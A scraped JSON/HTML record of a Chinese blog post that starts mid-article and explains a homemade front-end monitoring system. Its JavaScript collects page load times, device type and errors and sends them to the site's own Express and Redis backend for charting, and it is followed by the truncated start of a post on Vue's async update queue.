src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34a300fd3?w=214\u0026amp;h=216\u0026amp;f=gif\u0026amp;s=988503\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e然后接下来我一共设计了3块数据\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e页面加载时间\u003c/li\u003e\n\u003cli\u003e统计用户使用设备\u003c/li\u003e\n\u003cli\u003e错误量的统计\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e页面加载时间\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo = {};  \u003cspan class=\"hljs-comment\"\u003e//统计页面加载时间\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.openTime = performance.timing.navigationStart;\n\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.whiteScreenTime = +\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e() - \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.openTime;\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'DOMContentLoaded'\u003c/span\u003e,\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.readyTime = +\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e() - \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.openTime;\n});\n\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.allloadTime = +\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e() - \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.openTime;\n  \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.nowTime = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e().getTime();\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e timname = {\n    \u003cspan class=\"hljs-attr\"\u003ewhiteScreenTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'白屏时间'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ereadyTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'用户可操作时间'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eallloadTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'总下载时间'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003emobile\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'使用设备'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003enowTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'时间'\u003c/span\u003e,\n  };\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e logStr = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e timname) {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.warn(timname[i] + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i] + \u003cspan class=\"hljs-string\"\u003e'ms'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (i === \u003cspan class=\"hljs-string\"\u003e'mobile'\u003c/span\u003e) {\n      logStr += \u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e + i + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i];\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      logStr += \u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e + i + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i];\n    }\n\n  }\n  (\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image()).src = \u003cspan class=\"hljs-string\"\u003e'/action?'\u003c/span\u003e + logStr;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e统计用户使用设备\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.mobile = mobileType();\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003emobileType\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e u = navigator.userAgent, app = navigator.appVersion;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e type =  {\u003cspan class=\"hljs-comment\"\u003e// 移动终端浏览器版本信息\u003c/span\u003e\n    ios: !!u.match(\u003cspan class=\"hljs-regexp\"\u003e/\\(i[^;]+;( U;)? CPU.+Mac OS X/\u003c/span\u003e), \u003cspan class=\"hljs-comment\"\u003e//ios终端\u003c/span\u003e\n    iPad: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'iPad'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//是否iPad\u003c/span\u003e\n    android: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Android'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e || u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Linux'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//android终端或者uc浏览器\u003c/span\u003e\n    iPhone: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'iPhone'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e || u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Mac'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//是否为iPhone或者QQHD浏览器\u003c/span\u003e\n    trident: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Trident'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//IE内核\u003c/span\u003e\n    presto: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Presto'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//opera内核\u003c/span\u003e\n    webKit: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'AppleWebKit'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//苹果、谷歌内核\u003c/span\u003e\n    gecko: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Gecko'\u003c/span\u003e) \u0026gt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e \u0026amp;\u0026amp; u.indexOf(\u003cspan class=\"hljs-string\"\u003e'KHTML'\u003c/span\u003e) == \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//火狐内核\u003c/span\u003e\n    mobile: !!u.match(\u003cspan class=\"hljs-regexp\"\u003e/AppleWebKit.*Mobile/i\u003c/span\u003e) || !!u.match(\u003cspan class=\"hljs-regexp\"\u003e/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/\u003c/span\u003e), \u003cspan class=\"hljs-comment\"\u003e//是否为移动终端\u003c/span\u003e\n    webApp: u.indexOf(\u003cspan class=\"hljs-string\"\u003e'Safari'\u003c/span\u003e) == \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e//是否web应该程序，没有头部与底部\u003c/span\u003e\n  };\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e lists = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.keys(type);\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; lists.length; i++) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(type[lists[i]]) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e lists[i];\n    }\n  }  \n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e错误量的统计\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.allloadTime = +\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e() - \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.openTime;\n        \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo.nowTime = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e().getTime();\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e timname = {\n            \u003cspan class=\"hljs-attr\"\u003ewhiteScreenTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'白屏时间'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ereadyTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'用户可操作时间'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eallloadTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'总下载时间'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003emobile\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'使用设备'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003enowTime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'时间'\u003c/span\u003e,\n        };\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e logStr = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e timname) {\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.warn(timname[i] + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i] + \u003cspan class=\"hljs-string\"\u003e'ms'\u003c/span\u003e);\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (i === \u003cspan class=\"hljs-string\"\u003e'mobile'\u003c/span\u003e) {\n                logStr += \u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e + i + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i];\n            } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                logStr += \u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e + i + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.logInfo[i];\n            }\n            \n        }\n        (\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image()).src = \u003cspan class=\"hljs-string\"\u003e'/action?'\u003c/span\u003e + logStr;\n    };\n      \n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e defaults = {\n        \u003cspan class=\"hljs-attr\"\u003emsg\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// 错误的具体信息\u003c/span\u003e\n        url:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// 错误所在的url\u003c/span\u003e\n        line:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 错误所在的行\u003c/span\u003e\n        col:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// 错误所在的列\u003c/span\u003e\n        nowTime: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\u003cspan class=\"hljs-comment\"\u003e// 时间\u003c/span\u003e\n    };\n    \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.onerror = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emsg,url,line,col,error\u003c/span\u003e) \u003c/span\u003e{\n        col = col || (\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.event \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.event.errorCharacter) || \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n\n        defaults.url = url;\n        defaults.line = line;\n        defaults.col =  col;\n        defaults.nowTime = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e().getTime();\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (error \u0026amp;\u0026amp; error.stack){\n            \u003cspan class=\"hljs-comment\"\u003e// 如果浏览器有堆栈信息，直接使用\u003c/span\u003e\n            defaults.msg = error.stack.toString();\n\n        }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e.callee){\n            \u003cspan class=\"hljs-comment\"\u003e// 尝试通过callee拿堆栈信息\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ext = [];\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e fn = \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e.callee.caller;\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e floor = \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;  \n            \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (fn \u0026amp;\u0026amp; (--floor\u0026gt;\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)) {\n                ext.push(fn.toString());\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (fn  === fn.caller) {\n                    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n                }\n                fn = fn.caller;\n            }\n            ext = ext.join(\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003e);\n            defaults.msg = error.stack.toString();\n        }\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e defaults) {\n            \u003cspan class=\"hljs-comment\"\u003e// console.log(i,defaults[i]);\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(defaults[i] === \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e || defaults[i] === \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e) {\n                defaults[i] = \u003cspan class=\"hljs-string\"\u003e'null'\u003c/span\u003e; \n            }\n            str += \u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e+ i + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + defaults[i].toString();\n        }\n        srt = str.replace(\u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e).replace(\u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e).replace(\u003cspan class=\"hljs-regexp\"\u003e/\\s/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e);\n        (\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image()).src = \u003cspan class=\"hljs-string\"\u003e'/error?'\u003c/span\u003e + srt;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上就是收集数据的全部，通过发送/action请求或者是/error请求，这些都是可以自定义的，我讲的只是整个过程是如何实现的。\u003c/p\u003e\n\u003cp\u003e然后通过我的的一个后台express.js把所有的请求处理并都记录下来，记录好后的数据是这样子的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003euser_ip=127.0.0.1\u0026amp;whiteScreenTime=185\u0026amp;readyTime=192\u0026amp;allloadTime=208\u0026amp;mobile=webKit\u0026amp;nowTime=1513071388941\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003e数据处理\u003c/h1\u003e\n\u003cp\u003e这里我是通过自己写的一段脚本进行解析，parse.js，这里不具体讲解，看源码即可。我展现下解析好的数据。\u003c/p\u003e\n\u003cp\u003e我以cvs的数据格式储存，因为后面图表的需要，我也支持json格式方式导出，只不过后面就需要你自己来配置可视化的界面了。\u003c/p\u003e\n\u003cp\u003e数据是这样的。\u003c/p\u003e\n\u003cp\u003echarts/csvData/2017-12-16time.csv\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs txt\" lang=\"txt\"\u003e时间,白屏时间,用户可操作时间,总下载时间\u003cbr\u003e1513427051482,137,137,153\u003cbr\u003e1513427065080,470,471,507\u003cbr\u003e1513427080040,127,127,143\u003cbr\u003e1513428714345,274,275,323\u003cbr\u003e1513428733583,267,268,317\u003cbr\u003e1513428743167,268,268,317\u003cbr\u003e1513428754796,276,276,328\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003e数据展示\u003c/h1\u003e\n\u003cp\u003e这里我用的是\u003ca target=\"_blank\" href=\"https://www.hcharts.cn/\"\u003ehighcharts.js\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e具体的配置我不进行讲解，可以自己到官网进行查看。\u003c/p\u003e\n\u003cp\u003e下面是可视化的图表，显示的是每天各个时间段的信息。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce35649b7e7?w=861\u0026amp;h=1595\u0026amp;f=png\u0026amp;s=83479\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce35649b7e7?w=861\u0026amp;h=1595\u0026amp;f=png\u0026amp;s=83479\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e界面可能不是特别美观，还请见谅。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce3539eb419?w=237\u0026amp;h=234\u0026amp;f=gif\u0026amp;s=561618\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce3539eb419?w=237\u0026amp;h=234\u0026amp;f=gif\u0026amp;s=561618\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e环境\u003c/h2\u003e\n\u003cp\u003enode \u0026gt;= 6.0.0\u003c/p\u003e\n\u003cp\u003eredis \u0026gt;= 2.6.0\u003c/p\u003e\n\u003cp\u003e在这里我说明下，因为如果这个部署在线上环境的时候，如果每次记录都进行记录的话，会消耗大量的内存，所以我架设了一层redis，为了防止大流量的冲击，然后可以每隔一段时间进行存储。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e express = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'express'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e performance = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./lib/performance.js'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = express();\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e router = express.Router();\nrouter.get(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res, next\u003c/span\u003e) \u003c/span\u003e{\n  req.url = \u003cspan class=\"hljs-string\"\u003e'./index.html'\u003c/span\u003e;\n  next();\n});\napp.use(router);\napp.use(performance({\n    \u003cspan class=\"hljs-attr\"\u003etime\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 秒为单位\u003c/span\u003e\n    originalDir: \u003cspan class=\"hljs-string\"\u003e'./originalData'\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 数据的目录\u003c/span\u003e\n    errorDir: \u003cspan class=\"hljs-string\"\u003e'./errorData'\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 报错的目录\u003c/span\u003e\n}))\napp.use(express.static(\u003cspan class=\"hljs-string\"\u003e'./'\u003c/span\u003e));\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e server = app.listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里可以设置默认的时间，我这里以10秒为单位,为了demo的效果起见。一般我采用的是一分钟进行一次存储。\u003c/p\u003e\n\u003cp\u003e代码地址：\u003ca target=\"_blank\" href=\"https://github.com/hua1995116/mcharts\"\u003ehttps://github.com/hua1995116/mcharts\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e如有好的建议以及优化的方案，还请各位在Issues上提给我。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e进阶（一个利用监控平台的实战栗子）\u003c/h1\u003e\n\u003cp\u003e我利用这个平台对我的一个项目进行了监控。如果你只是纯粹玩的话，还请只阅读上面的原系统地址，可以忽视我这一段，毕竟我这个系统还不够完善。\u003c/p\u003e\n\u003cp\u003e线上demo：\u003ca target=\"_blank\" href=\"http://www.qiufengh.com/#/\"\u003ehttp://www.qiufengh.com/#/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e监控demo：\u003ca target=\"_blank\" href=\"http://qiufengh.com:8080/\"\u003ehttp://qiufengh.com:8080/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e项目: \u003ca target=\"_blank\" href=\"https://github.com/hua1995116/webchat/tree/monitoring\"\u003ehttps://github.com/hua1995116/webchat/tree/monitoring\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在这里我设置了每过1分钟记录一次日志。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 监控引入\u003c/span\u003e\napp.use(performance({\n    \u003cspan class=\"hljs-attr\"\u003etime\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 秒为单位\u003c/span\u003e\n    originalDir: \u003cspan class=\"hljs-string\"\u003e'./originalData'\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 数据的目录\u003c/span\u003e\n    errorDir: \u003cspan class=\"hljs-string\"\u003e'./errorData'\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 报错的目录\u003c/span\u003e\n}))\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以及每隔10分钟进行一次解析。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003esetPrase\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    setInterval(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        parseData();\n      }, \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce389311f6b?w=205\u0026amp;h=205\u0026amp;f=gif\u0026amp;s=29900\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce389311f6b?w=205\u0026amp;h=205\u0026amp;f=gif\u0026amp;s=29900\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e2017-12-20\u003c/p\u003e\n\u003cp\u003e本文只是提供一个思路，如果想要专业的，可以使用\u003ca target=\"_blank\" href=\"https://www.elastic.co/cn/products\"\u003eELK\u003c/a\u003e之类专业的统计分析工具。\u003c/p\u003e\n","buildTime":"1515066067.9242","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c00d"},"id":"5a45fdeb6fb9a044ff31c9a8","author":{"$oid":"5a4e178e201569114874c000"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Vue异步更新队列原理从入门到放弃","meta":{"likeCount":0},"tag":["Vue.js","JavaScript","前端"],"comment":[],"shortContent":"声明：本文章中所有源码取自Version: 2.5.13的dev分支上的Vue，不保证文章内观点的绝对准确性。文章整理自本周我在小组的内部分享。 我们目前的技术栈主要采用Vue，而工作中我们碰到了一种情况是当传入某些组件内的props被改变时我们需要重置整个组件的生命周期（比如…","content":"\u003cp\u003e声明：本文章中所有源码取自Version: 2.5.13的dev分支上的Vue，不保证文章内观点的绝对准确性。文章整理自本周我在小组的内部分享。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/wangweida/blog/issues/25\"\u003e文章原地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e我们目前的技术栈主要采用Vue，而工作中我们碰到了一种情况是当传入某些组件内的props被改变时我们需要重置整个组件的生命周期（比如更改IView中datepicker的type，好消息是目前该组件已经可以不用再使用这么愚蠢的方法来切换时间显示器的类型）。为了达成这个目的，于是我们有了如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026lt;template\u0026gt;\n  \u0026lt;button @click=\"handleClick\"\u0026gt;btn\u0026lt;/button\u0026gt;\n  \u0026lt;someComponent  v-if=\"show\" /\u0026gt;\n\u0026lt;/template\u0026gt;\n\n\u0026lt;script\u0026gt;\n  {\n    data() {\n      return { show: true }\n    },\n    